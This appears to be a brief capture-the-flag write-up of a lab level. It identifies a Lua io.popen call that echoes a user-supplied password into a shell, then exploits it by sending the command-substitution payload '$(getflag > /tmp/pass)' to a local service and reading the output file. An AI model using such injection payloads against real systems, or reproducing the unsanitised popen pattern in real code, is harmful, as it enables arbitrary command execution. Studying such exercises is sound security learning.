after some search, this line is suspicious :

prog = io.popen("echo "..pass.." | sha1sum", "r")

it look's like it echo what we pass pipe to sha1 and then open this file 

we can controll "pass" variable"

we can execute anything since we're the one passing `pass`

nc localhost 5151
$(getflag > /tmp/pass)
cat /tmp/pass
